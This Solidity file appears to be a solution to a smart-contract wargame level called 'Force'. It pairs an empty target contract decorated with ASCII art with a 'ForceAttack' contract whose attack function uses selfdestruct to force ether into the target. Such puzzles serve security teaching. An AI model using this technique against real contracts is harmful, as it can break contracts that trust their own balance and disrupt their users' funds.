// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

pragma solidity ^0.8.0;

contract ForceAttack {

  constructor() payable {}
  receive() external payable {}

  function attack(address payable target) public {
    selfdestruct(target);
  }
}
